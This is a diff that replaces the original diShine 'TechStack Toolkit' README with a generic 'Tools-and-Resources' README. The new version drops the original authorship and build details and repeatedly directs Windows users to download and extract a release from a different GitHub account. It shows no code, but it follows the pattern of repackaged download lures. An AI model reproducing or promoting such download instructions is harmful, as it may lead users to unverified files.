@@ -1,197 +1,220 @@
-# 📚 TechStack Toolkit: 426 curated tools, smart utility-based matching and full-stack exports in PDF, Markdown, and TXT
+# 🛠️ Tools-and-Resources - Find Better Tools Fast
 
-<div align="center">
-  
-[![diShine Logo](https://dishine.it/favicon.ico)](https://dishine.it/)
+[![Download Tools-and-Resources](https://img.shields.io/badge/Download%20Now-Purple?style=for-the-badge&logo=github)](https://github.com/nancyunimproved357/Tools-and-Resources/releases)
 
-***Transform. Automate. Shine!***
+## 📦 What this is
 
-[![Website](https://img.shields.io/badge/Website-dishine.it-blue)](https://dishine.it/)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-diShine-blue)](https://linkedin.com/company/100682596)
-[![Location](https://img.shields.io/badge/Location-Milan%2C%20Italy-green)]()
-[![License: CC0](https://img.shields.io/badge/License-CC0%201.0-lightgrey)](LICENSE)
+Tools-and-Resources is a single HTML file that helps you browse 426 digital tools, compare options, and match alternatives with clear results. It works well for people who want to build a tech stack for a client, compare free and paid tools, or keep a clean reference list in one place.
 
-<p align="center">
-  <img src="images/techstack_02_stack_builder_workflow.webp" alt="Tech stack window" width="90%">
-</p>
+You can open it on Windows in your browser. No install steps, no extra apps, and no setup files beyond the download itself.
 
-*A client-ready toolkit for agencies, consultants, and digital teams. Browse the directory, build a stack, compare free and paid alternatives, and export a branded recommendation pack prepared by diShine Digital Agency.*
+## ✅ What you can do
 
-Built by [diShine Digital Agency](https://dishine.it).
+- Browse a large list of digital tools in one place
+- Find alternatives for common apps and services
+- Compare free and paid options
+- Build a consulting tech stack
+- Export reports with three sections
+- Use a local HTML file with no extra dependencies
+- Keep your data on your computer
 
-</div>
+## 💻 Before you start
 
-<p align="center">
-  <img src="images/techstack_05_alternatives_report_detail.webp" alt="Tech stack alternatives tools" width="49%">
-  <img src="images/techstack_04_branded_report_preview.webp" alt="Tech stack report" width="49%">
-</p>
+You only need:
 
----
+- A Windows computer
+- A web browser such as Chrome, Edge, or Firefox
+- Internet access to download the file
 
-## 📖 Documentation
+The app runs as a local HTML file, so it opens like a webpage on your own computer.
 
-| Document | Description |
-|----------|-------------|
-| [GUIDE.md](GUIDE.md) | End-user guide (browsing, stacking, exporting) |
-| [CONTRIBUTING.md](CONTRIBUTING.md) | How to add tools, field reference, and matching tips |
-| [ALGORITHM.md](ALGORITHM.md) | Technical reference for the matching engine scoring and thresholds |
-| [DIRECTORY.md](DIRECTORY.md) | Static Markdown listing of all 426 tools with metadata and statistics |
-| [CHANGELOG.md](CHANGELOG.md) | Release notes and version history |
+## 🚀 Download and open on Windows
 
----
+1. Visit the release page: https://github.com/nancyunimproved357/Tools-and-Resources/releases
+2. Download the latest release file from that page
+3. If the file comes as a .zip, right-click it and choose Extract All
+4. Open the extracted folder
+5. Double-click the HTML file to open it in your browser
+6. If Windows asks which app to use, pick Chrome, Edge, or Firefox
 
-## What ships now
+If the release includes a packaged file, save it to a folder you can find later, then open it from there.
 
-- **Utility-first matching engine** that prioritizes the same use-case before broader same-category fallbacks
-- **Full stack exports** with the chosen stack, free alternatives, and paid alternatives in every file
-- **Timestamped filenames** on exports (`diShine-tool-stack-YYYY-MM-DD.pdf`) to prevent overwrites
-- **Branded outputs** in **PDF**, **Markdown**, and **TXT** with an in-browser **Preview**
-- **9 Agency Playbooks**: pre-built tool stacks for marketing, productivity, video, design, AI, e-commerce, privacy, bootstrap delivery, and content
-- **Subcategory filter**: dropdown to filter by any of the 63 subcategories for faster discovery
-- **Shared runtime logic** across the Astro app, standalone HTML build, and regression tests
-- **Documentation integrity checks** (`npm run lint:docs`) to prevent drift between data and docs
-- **Improved stack UX** with pricing filters, clearer stack state, reset support, and report preview
+## 🖱️ First-time use
 
----
+When the file opens, you should see the main tool list and search options.
 
-## Run locally
+Use it like this:
 
-```bash
-npm install
-npm run build
-npm test
-npm run build:standalone
-```
+1. Type a tool name, category, or keyword in the search box
+2. Review the matched tools
+3. Open a tool record to see details
+4. Compare similar tools when you need an alternative
+5. Export a report when you want to save the results
 
-### Available scripts
+The layout is built for quick review, so you can move from search to report without extra steps.
 
-| Command | Purpose |
-|---|---|
-| `npm run dev` | Start the Astro app locally |
-| `npm run build` | Build the Astro app |
-| `npm test` | Run matching and export regression checks |
-| `npm run build:standalone` | Regenerate `standalone.html` |
-| `npm run build:md` | Regenerate `DIRECTORY.md` with statistics |
-| `npm run build:all` | Run standalone build, Markdown build, and tests in sequence |
-| `npm run lint:docs` | Validate documentation references match the actual data |
-| `npm run preview` | Preview the production build |
+## 🔍 How the matching works
 
----
+The tool uses intelligent matching to suggest alternatives based on name, use case, and tool category. This helps when you know what you need, but not which product to pick.
 
-## Product behavior
+You may use it to find tools for:
 
-### Stack builder
+- SEO work
+- Web development
+- Automation
+- Privacy-focused tasks
+- Marketing tasks
+- Productivity and planning
+- Agency stack building
+- Developer workflows
 
-- Add any tool to **My Stack**
-- Switch between **Chosen stack**, **Free alternatives**, and **Paid alternatives** views
-- Reset back to the original hand-picked selection at any time
-- Add optional client notes before export
+The matching is built for practical use, so it helps narrow choices instead of showing a long, random list.
 
-### Agency playbooks
+## 🧩 Main sections
 
-Pre-built tool stacks for common delivery scenarios are available on the main page. Each playbook includes a curated set of tools that work well together for a specific workflow:
+### 🗂️ Tool library
 
-- **The Privacy Tech Stack**: analytics and tracking without cookie banners
-- **The Bootstrap Delivery Stack**: launch an agency site for $0
-- **Modern Content Engine**: SEO optimized content lifecycle
-- **The Marketing Powerhouse**: full-funnel marketing from SEO to email automation
-- **Agency Productivity Suite**: project management, docs, and team communication
-- **Video Production Pipeline**: end-to-end video creation from capture to publish
-- **Design & Brand Identity**: UI design, prototyping, and brand asset creation
-- **AI-Powered Agency**: leverage AI across writing, code, and creative tasks
-- **E-Commerce Launchpad**: build, manage, and grow an online store
+This section holds the full curated list of digital tools. It includes common app types, niche services, and utility tools used in consulting and marketing work.
 
-### Export package
+### 🔄 Alternative matching
 
-Every export includes:
+This section helps you compare tools with similar jobs. It is useful when a client wants a cheaper option, a free version, or a privacy-friendly replacement.
 
-1. **Chosen Stack**
-2. **Free Alternatives**
-3. **Paid Alternatives**
+### 📄 Report export
 
-The report is generated with diShine branding and can be delivered as:
+This section lets you create a triple-section report. It is useful when you need a simple handoff for a client, team member, or internal review.
 
-- **Preview**: view the branded HTML report in-browser before downloading
-- **PDF**: branded downloadable report (`diShine-tool-stack-YYYY-MM-DD.pdf`)
-- **Markdown**: easy to paste into proposals, docs, and Notion
-- **TXT**: clean plain-text handoff
+### 🧠 Stack building
 
-Export filenames include a date stamp to prevent file overwrites when generating multiple reports.
+This section helps you assemble tools into a full setup for a project, business, or client account. It works well when you need a clean list of tools that fit together.
 
-### Matching rules
+## 🪟 Typical Windows setup
 
-The engine only searches inside the **same category**, then strongly prioritizes the **same subcategory / utility cluster**. If no strong match exists, it returns no recommendation instead of forcing a weak one.
+For most Windows users, the process looks like this:
 
-For the technical details, see [ALGORITHM.md](ALGORITHM.md).
+1. Download the release from GitHub
+2. Save the file to Downloads or Desktop
+3. Extract it if the file is zipped
+4. Open the HTML file in your browser
+5. Bookmark the page if you plan to use it often
 
----
+If the file does not open on double-click, right-click it, choose Open with, then select your browser.
 
-## Project structure
+## 🔐 Privacy and local use
 
-### Application
+The app runs from a local HTML file, which keeps use simple and private. You do not need to sign in to use the file. You do not need to install a database. You do not need to connect it to a cloud service to browse the list.
 
-- `src/pages/index.astro`: main Astro experience
-- `src/components/ToolCard.astro`: tool card UI
-- `src/layouts/Layout.astro`: shared HTML layout with header and footer
-- `src/styles/global.css`: global stylesheet
-- `src/lib/toolkit-core.js`: shared matching, report, PDF, and HTML helpers
-- `src/lib/toolkit-app.js`: shared browser-side stack behavior
+That makes it useful for:
 
-### Data
+- Private research
+- Client work
+- Internal planning
+- Offline reference after download
 
-- `src/data/tools.json`: tool dataset (426 entries)
-- `src/data/stacks.json`: Agency Playbook definitions (9 playbooks)
+## 🧭 Good use cases
 
-### Build & test
+Use Tools-and-Resources when you need to:
 
-- `build-standalone.js`: standalone HTML generator
-- `build-md.js`: DIRECTORY.md generator (with statistics header)
-- `test.js`: regression checks for matching, exports, and alternativeTo validation
-- `lint-docs.js`: documentation integrity checker
+- Compare tools for a new client site
+- Replace a paid tool with a free one
+- Build a better SEO stack
+- Map out tools for a marketing team
+- Keep a list of trusted resources for web work
+- Review software before a purchase
+- Create a report with clear sections
 
-### Generated outputs
+## 🛠️ File layout
 
-- `standalone.html`: generated single-file delivery build
-- `DIRECTORY.md`: generated Markdown tool directory with statistics
+After download, you may see one of these:
 
-### Documentation
+- A single HTML file
+- A ZIP file that contains the HTML file
+- A folder with support files and the main page
 
-- `README.md`: project overview (this file)
-- `GUIDE.md`: end-user guide for browsing, stacking, and exporting
-- `CONTRIBUTING.md`: contributor guide with field reference and tips
-- `ALGORITHM.md`: matching engine technical reference
-- `CHANGELOG.md`: release notes
-- `CODE_OF_CONDUCT.md`: community standards
-- `SECURITY.md`: vulnerability reporting policy
+Open the main HTML file in a browser. If there are extra files, keep them in the same folder so the page can load all parts correctly.
 
-### Utilities
+## 🧪 If the page does not open
 
-- `parse.js`: data parsing helpers
-- `add-fmhy.js` / `add-fmhy-bulk.js`: import helpers for external tool lists
+If Windows does not open the file at once:
 
----
+1. Right-click the file
+2. Choose Open with
+3. Select Microsoft Edge, Chrome, or Firefox
+4. Check the box to always use that app if you want
 
-## Dataset
+If the page looks blank, make sure you opened the main HTML file and not a support file.
 
-- **426 tools** across **21 categories** and **63 subcategories**
-- **11 agency picks** (curated top recommendations)
-- **46 curated `alternativeTo` relationships** for direct competitor matching
-- Pricing distribution: 89 free · 106 open-source · 92 freemium · 139 paid
-- Structured metadata for category, subcategory, pricing, tags, learning curve, and curated relationships
+## 📁 Recommended folder setup
 
----
+For easy access, create a folder like this:
 
-## License
+- Documents
+  - Tools-and-Resources
 
-Built and maintained by [diShine Digital Agency](https://dishine.it). Licensed under the [CC0 1.0 Universal](LICENSE) license.
+Keep the downloaded file and any extracted files in that folder. This makes it easier to find the app later and keeps the release files in one place.
 
----
+## 🔧 What to expect from the data
 
-## About diShine
+The tool list covers many common digital work areas, including:
 
-[diShine](https://dishine.it) is a creative tech agency based in Milan. We create digital strategies, design process and build tools for clients, help businesses with AI strategy and MarTech architecture, and open-source some things we wish existed.
+- Agency tools
+- AI tools
+- Automation tools
+- Developer tools
+- Digital marketing tools
+- SEO tools
+- Web development tools
+- Privacy tools
+- Productivity tools
 
-- Web: [dishine.it](https://dishine.it)
-- GitHub: [github.com/diShine-digital-agency](https://github.com/diShine-digital-agency)
-- Contact: kevin@dishine.it
+The list is curated, so it aims to reduce time spent searching across many websites.
 
+## 📤 Exported report format
+
+The exported report uses three sections, which may include:
+
+- Selected tools
+- Suggested alternatives
+- Notes or stack details
+
+This structure works well when you need a clear handoff for a client or a team lead.
+
+## 🧼 Keeping the file current
+
+To stay current:
+
+1. Check the release page when you want an update
+2. Download the newest version
+3. Replace the old file with the new one
+4. Open the updated HTML file in your browser
+
+This keeps your local copy in sync with the latest tool list and matching data.
+
+## 🧭 Topics covered
+
+The repository focuses on tools and resources for:
+
+- Agency work
+- AI tools
+- Automation
+- Curated lists
+- Developer tools
+- Digital marketing
+- Markdown workflows
+- Open-source resources
+- Privacy
+- Productivity
+- SEO
+- Tech stacks
+- Web development
+
+These topics help the app serve both general users and people who build tool stacks for work.
+
+## 📌 Quick start
+
+1. Go to the release page: https://github.com/nancyunimproved357/Tools-and-Resources/releases
+2. Download the latest file
+3. Open the HTML file in your browser
+4. Search for a tool or category
+5. Review alternatives
+6. Export a report if needed
